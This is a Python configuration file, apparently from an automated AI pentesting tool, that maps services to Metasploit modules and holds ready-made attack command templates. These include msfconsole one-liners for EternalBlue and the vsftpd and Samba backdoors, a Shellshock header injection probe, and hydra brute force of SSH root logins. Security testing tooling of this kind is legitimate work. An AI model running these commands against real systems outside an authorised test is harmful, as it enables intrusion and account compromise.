"""
PentestAI v10 — Tools Registry & Validation Databases
Validated MSF modules, correct parameters, exploit prerequisites.

v10 change: the static CVE_ACCURACY dict has been REPLACED by the dynamic
`CVEEnricher` (config.cve_enricher). A minimal legacy shim is kept so code
that still imports CVE_ACCURACY continues to work — it reads from the
enricher's internal static fallback table, which itself only kicks in when
NVD is unreachable.
"""
import re

# ── Real Metasploit modules with CORRECT parameters ─────────────────────
REAL_MSF_MODULES = {
    # FTP
    "vsftpd_234_backdoor":      "exploit/unix/ftp/vsftpd_234_backdoor",
    "ftp_version":              "auxiliary/scanner/ftp/ftp_version",
    "ftp_anonymous":            "auxiliary/scanner/ftp/anonymous",
    "proftpd_133c_backdoor":    "exploit/unix/ftp/proftpd_133c_backdoor",
    # SMB / Windows
    "ms17_010_eternalblue":     "exploit/windows/smb/ms17_010_eternalblue",
    "ms17_010_psexec":          "exploit/windows/smb/ms17_010_psexec",
    "psexec":                   "exploit/windows/smb/psexec",
    "smb_ms08_067":             "exploit/windows/smb/ms08_067_netapi",
    "smb_login":                "auxiliary/scanner/smb/smb_login",
    "smb_enumshares":           "auxiliary/scanner/smb/smb_enumshares",
    "smb_version":              "auxiliary/scanner/smb/smb_version",
    # SSH
    "ssh_login":                "auxiliary/scanner/ssh/ssh_login",
    "ssh_enumusers":            "auxiliary/scanner/ssh/ssh_enumusers",
    # HTTP/Web
    "drupal_drupalgeddon2":     "exploit/unix/webapp/drupal_drupalgeddon2",
    "wp_admin_shell_upload":    "exploit/unix/webapp/wp_admin_shell_upload",
    "php_cgi_arg_injection":    "exploit/multi/http/php_cgi_arg_injection",
    "tomcat_mgr_upload":        "exploit/multi/http/tomcat_mgr_upload",
    "apache_mod_cgi_bash_env":  "exploit/multi/http/apache_mod_cgi_bash_env_exec",
    "http_version":             "auxiliary/scanner/http/http_version",
    "jboss_invoke_deploy":      "exploit/multi/http/jboss_invoke_deploy",
    "jenkins_script_console":   "exploit/multi/http/jenkins_script_console",
    "struts2_content_type_ognl":"exploit/multi/http/struts2_content_type_ognl",
    # MySQL / DB
    "mysql_login":              "auxiliary/scanner/mysql/mysql_login",
    "mysql_enum":               "auxiliary/admin/mysql/mysql_enum",
    "mssql_login":              "auxiliary/scanner/mssql/mssql_login",
    "postgres_login":           "auxiliary/scanner/postgres/postgres_login",
    "postgres_readfile":        "auxiliary/admin/postgres/postgres_readfile",
    # Post exploitation
    "local_exploit_suggester":  "post/multi/recon/local_exploit_suggester",
    "hashdump":                 "post/linux/gather/hashdump",
    "hashdump_win":             "post/windows/gather/hashdump",
    # Samba
    "samba_usermap_script":     "exploit/multi/samba/usermap_script",
    "samba_symlink_traversal":  "auxiliary/admin/smb/samba_symlink_traversal",
    # Misc
    "distcc_exec":              "exploit/unix/misc/distcc_exec",
    "unreal_ircd_3281_backdoor":"exploit/unix/irc/unreal_ircd_3281_backdoor",
    "java_rmi_server":          "exploit/multi/misc/java_rmi_server",
    "bind_shell":               "exploit/multi/handler",
    "port_scan":                "auxiliary/scanner/portscan/tcp",
    # VNC
    "vnc_login":                "auxiliary/scanner/vnc/vnc_login",
    "vnc_none_auth":            "auxiliary/scanner/vnc/vnc_none_auth",
    # Telnet
    "telnet_login":             "auxiliary/scanner/telnet/telnet_login",
}

# ── MSF parameter templates ──────────────────────────────────────────────
MSF_PARAM_TEMPLATES = {
    "exploit/unix/ftp/vsftpd_234_backdoor": {
        "required": ["RHOSTS"],
        "template": "use {module}; set RHOSTS {target}; run",
        "notes": "No LHOST needed — backdoor opens bind shell on port 6200",
        "validation": "nc -zv {target} 21 2>&1 | grep -q open",
        "port": 21,
    },
    "exploit/multi/samba/usermap_script": {
        "required": ["RHOSTS", "LHOST"],
        "template": "use {module}; set RHOSTS {target}; set LHOST {lhost}; run",
        "notes": "Needs LHOST for reverse shell. Target must run Samba 3.0.20-3.0.25rc3",
        "port": 139,
    },
    "exploit/unix/misc/distcc_exec": {
        "required": ["RHOSTS", "LHOST"],
        "template": "use {module}; set RHOSTS {target}; set LHOST {lhost}; run",
        "port": 3632,
    },
    "exploit/unix/irc/unreal_ircd_3281_backdoor": {
        "required": ["RHOSTS"],
        "template": "use {module}; set RHOSTS {target}; run",
        "port": 6667,
    },
    "exploit/multi/http/php_cgi_arg_injection": {
        "required": ["RHOSTS", "LHOST"],
        "template": "use {module}; set RHOSTS {target}; set LHOST {lhost}; run",
        "notes": "Target must have PHP-CGI enabled (not mod_php)",
        "port": 80,
    },
    "exploit/multi/http/apache_mod_cgi_bash_env_exec": {
        "required": ["RHOSTS", "LHOST", "TARGETURI"],
        "template": "use {module}; set RHOSTS {target}; set LHOST {lhost}; set TARGETURI /cgi-bin/; run",
        "notes": "Shellshock — requires CGI enabled AND a valid CGI script path",
        "validation": "curl -s http://{target}/cgi-bin/ | head -5",
        "port": 80,
    },
    "exploit/windows/smb/ms17_010_eternalblue": {
        "required": ["RHOSTS", "LHOST"],
        "template": "use {module}; set RHOSTS {target}; set LHOST {lhost}; run",
        "validation": "nmap -p 445 --script smb-vuln-ms17-010 {target}",
        "port": 445,
    },
    "auxiliary/scanner/ssh/ssh_login": {
        "required": ["RHOSTS", "USERNAME", "PASS_FILE"],
        "template": "use {module}; set RHOSTS {target}; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; set STOP_ON_SUCCESS true; run",
        "notes": "Brute force — only use after confirming no easier attack vector",
        "port": 22,
    },
}

# ── Exploit prerequisites — MUST be validated before exploit ─────────────
EXPLOIT_PREREQUISITES = {
    "exploit/unix/ftp/vsftpd_234_backdoor": {
        "service": "vsftpd 2.3.4",
        "port": 21,
        "checks": [
            {"desc": "FTP port open", "cmd": "nc -zv {target} 21", "expect": "open"},
            {"desc": "Banner shows vsftpd 2.3.4", "cmd": "echo | nc -w3 {target} 21", "expect": "vsftpd 2.3.4"},
        ],
        "cve": "CVE-2011-2523",
        "cvss": 10.0,
    },
    "exploit/multi/samba/usermap_script": {
        "service": "Samba 3.0.20-3.0.25rc3",
        "port": 139,
        "checks": [
            {"desc": "SMB port open", "cmd": "nc -zv {target} 139", "expect": "open"},
            {"desc": "Samba version in range", "cmd": "smbclient -N -L //{target} 2>&1", "expect": "Samba"},
        ],
        "cve": "CVE-2007-2447",
        "cvss": 9.3,
    },
    "exploit/multi/http/apache_mod_cgi_bash_env_exec": {
        "service": "Apache with CGI + vulnerable Bash",
        "port": 80,
        "checks": [
            {"desc": "HTTP port open", "cmd": "curl -sI http://{target} | head -1", "expect": "200\\|302\\|301"},
            {"desc": "CGI directory exists", "cmd": "curl -s -o /dev/null -w '%{{http_code}}' http://{target}/cgi-bin/", "expect": "200\\|403"},
            {"desc": "Shellshock test", "cmd": "curl -s -H 'User-Agent: () {{ :;}}; echo vulnerable' http://{target}/cgi-bin/ 2>&1", "expect": ""},
        ],
        "cve": "CVE-2014-6271",
        "cvss": 10.0,
        "notes": "Apache 2.2.8 alone ≠ Shellshock. Must verify CGI is active and Bash is used.",
    },
    "exploit/unix/misc/distcc_exec": {
        "service": "distccd",
        "port": 3632,
        "checks": [
            {"desc": "distcc port open", "cmd": "nc -zv {target} 3632", "expect": "open"},
        ],
        "cve": "CVE-2004-2687",
        "cvss": 9.3,
    },
}


# ═════════════════════════════════════════════════════════════════════════════
#  CVE_ACCURACY — v10 legacy compatibility shim
# ═════════════════════════════════════════════════════════════════════════════
# The static dict has been REPLACED by the live `CVEEnricher`. This shim keeps
# old imports working; it dynamically exposes the enricher's fallback table.
#
# v10 code should use `from config.cve_enricher import cve_enricher` directly,
# calling `await cve_enricher.enrich_service(...)`.
# ═════════════════════════════════════════════════════════════════════════════

class _CVEAccuracyShim(dict):
    """Backwards-compatible dict that proxies to the enricher's fallback table."""

    def __init__(self):
        super().__init__()
        self._loaded = False

    def _ensure_loaded(self):
        if self._loaded:
            return
        try:
            from config.cve_enricher import _STATIC_CVE_FALLBACK  # noqa: PLC0415
            for cve_id, data in _STATIC_CVE_FALLBACK.items():
                super().__setitem__(cve_id, {
                    "service":     data.get("service", ""),
                    "impact":      data.get("description", "")[:120],
                    "exploitable": bool(data.get("msf_module")) and data.get("cvss3", 0) >= 7.0,
                    "msf":         data.get("msf_module", ""),
                    "cvss":        data.get("cvss3", 0.0),
                })
        except Exception:  # noqa: BLE001
            pass
        self._loaded = True

    def __contains__(self, key):
        self._ensure_loaded()
        return super().__contains__(key)

    def __getitem__(self, key):
        self._ensure_loaded()
        return super().__getitem__(key)

    def get(self, key, default=None):
        self._ensure_loaded()
        return super().get(key, default)

    def keys(self):
        self._ensure_loaded()
        return super().keys()

    def values(self):
        self._ensure_loaded()
        return super().values()

    def items(self):
        self._ensure_loaded()
        return super().items()


CVE_ACCURACY = _CVEAccuracyShim()


# ── Service → attack strategy ────────────────────────────────────────────
SERVICE_ATTACK_STRATEGY = {
    "vsftpd 2.3.4": {
        "priority": 1,
        "strategy": "VALIDATE → EXPLOIT",
        "steps": [
            {"action": "Validate backdoor port", "cmd": "nc -zv {target} 6200 -w3", "risk": "green"},
            {"action": "Validate FTP banner", "cmd": "echo '' | nc -w3 {target} 21", "risk": "green"},
            {"action": "Exploit if confirmed", "cmd": "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {target}; run; exit'", "risk": "red"},
        ],
        "cve": "CVE-2011-2523",
    },
    "openssh": {
        "priority": 3,
        "strategy": "ENUMERATE → BRUTE (last resort)",
        "steps": [
            {"action": "Check for weak keys", "cmd": "nmap --script ssh-hostkey {target}", "risk": "green"},
            {"action": "Enumerate users", "cmd": "msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS {target}; set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt; set THREADS 5; run; exit'", "risk": "orange"},
            {"action": "Brute force (ONLY if no other vector)", "cmd": "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 4 -f", "risk": "red"},
        ],
        "notes": "OpenSSH 4.7p1 is old but NOT directly exploitable via RCE. Do NOT waste time on MSF exploits.",
    },
    "apache 2.2": {
        "priority": 2,
        "strategy": "FINGERPRINT → ENUMERATE → VALIDATE CVE",
        "steps": [
            {"action": "HTTP headers analysis", "cmd": "curl -sI http://{target}", "risk": "green"},
            {"action": "Technology detection", "cmd": "curl -s http://{target} | head -50", "risk": "green"},
            {"action": "Check CGI (for Shellshock)", "cmd": "curl -s -o /dev/null -w '%{{http_code}}' http://{target}/cgi-bin/", "risk": "green"},
            {"action": "Nikto scan", "cmd": "nikto -h http://{target} -nointeractive", "risk": "orange"},
            {"action": "PHP version check", "cmd": "curl -sI http://{target}/index.php | grep -i 'x-powered-by\\|php'", "risk": "green"},
        ],
        "notes": "Apache 2.2.8 alone is NOT exploitable. Must identify specific vuln (PHP-CGI, Shellshock, etc.)",
    },
}

NOT_DIRECTLY_EXPLOITABLE = {
    "ssh": "OpenSSH vulnerabilities are mostly info-disclosure or DoS. Direct RCE is extremely rare for OpenSSH 4.x+. Strategy: enumerate users, try weak credentials, check for weak keys. Do NOT run MSF SSH exploits blindly.",
    "smtp": "Old SMTP → try user enumeration (VRFY/EXPN), open relay check, not direct RCE.",
    "apache/2.2": "Apache 2.2 alone is NOT directly exploitable. Must check: PHP-CGI (CVE-2012-1823), Shellshock (needs CGI+Bash), mod_proxy SSRF, specific webapp vulns. Never claim generic Apache RCE.",
    "ssl": "SSL/TLS issues are weak crypto/renegotiation, not direct RCE.",
}

HIGH_RISK_PORTS = {21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445,
                   993, 995, 1433, 1521, 2049, 3306, 3389, 4444, 5432, 5900,
                   6379, 8080, 8443, 27017}

PENTEST_PHASES = [
    "scope", "reconnaissance", "scanning",
    "vulnerability_analysis", "exploitation",
    "post_exploitation", "reporting",
]

TOOL_AGENT_MAP = {
    "nmap": "scan", "masscan": "scan", "rustscan": "scan",
    "nuclei": "vuln", "searchsploit": "vuln", "nikto": "vuln",
    "gobuster": "scan", "ffuf": "scan", "dirb": "scan",
    "sqlmap": "vuln", "wpscan": "vuln",
    "curl": "recon", "wget": "recon",
    "whois": "recon", "dig": "recon", "host": "recon",
    "amass": "recon", "subfinder": "recon", "theHarvester": "recon",
    "msfconsole": "exploit", "msfvenom": "exploit",
    "hydra": "exploit", "john": "exploit", "hashcat": "exploit",
    "smbclient": "scan", "enum4linux": "scan", "crackmapexec": "scan",
}


def validate_msf_module(module: str) -> tuple:
    """Validate a Metasploit module name. Returns (is_valid, corrected, warning)."""
    if module.startswith(("exploit/", "auxiliary/", "post/")):
        for key, full in REAL_MSF_MODULES.items():
            if full == module:
                return True, module, None
        return False, module, f"Module '{module}' not in validated list. Run: searchsploit <service>"

    for key, full in REAL_MSF_MODULES.items():
        if key in module.lower() or module.lower() in key:
            return True, full, None

    return False, module, f"Module '{module}' not recognized. Run: searchsploit <service>"


def validate_msf_command(command: str, target: str = "") -> str:
    """Validate and correct MSF command format + parameters."""
    if not command or "msfconsole" not in command.lower():
        return command

    parts = command.strip().split()
    if parts and parts[0].lower() in ("use", "set", "exploit", "run"):
        safe = command.replace("'", '"')
        return f"msfconsole -q -x '{safe}; exit'"

    msf_m = re.search(r"use\s+([\w/]+)", command)
    if msf_m:
        raw_mod = msf_m.group(1)
        valid, corrected, _ = validate_msf_module(raw_mod)
        if corrected != raw_mod:
            command = command.replace(raw_mod, corrected)

        if "set LPORT" in command and "set RPORT" not in command:
            pass
        if "set RPORT" in command:
            tmpl = MSF_PARAM_TEMPLATES.get(corrected, {})
            expected_port = tmpl.get("port")
            rport_m = re.search(r"set RPORT\s+(\d+)", command)
            if rport_m and expected_port and int(rport_m.group(1)) != expected_port:
                command = re.sub(r"set RPORT\s+\d+", f"set RPORT {expected_port}", command)

    return command


def get_exploit_prerequisites(module: str) -> dict:
    return EXPLOIT_PREREQUISITES.get(module, {})


def get_service_strategy(service_banner: str) -> dict:
    banner_lower = service_banner.lower()
    for key, strategy in SERVICE_ATTACK_STRATEGY.items():
        if key.lower() in banner_lower:
            return strategy
    return {}
